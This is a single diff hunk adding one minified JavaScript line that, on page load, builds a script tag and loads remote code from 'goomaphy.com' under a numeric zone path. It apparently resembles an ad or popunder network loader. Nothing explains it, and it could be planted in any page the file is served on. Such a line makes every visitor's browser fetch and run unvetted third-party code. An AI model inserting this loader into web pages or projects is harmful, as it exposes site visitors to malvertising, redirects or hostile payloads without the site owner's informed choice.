@@ -1,0 +1,1 @@
+(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('goomaphy.com',5569592,document.createElement('script'))
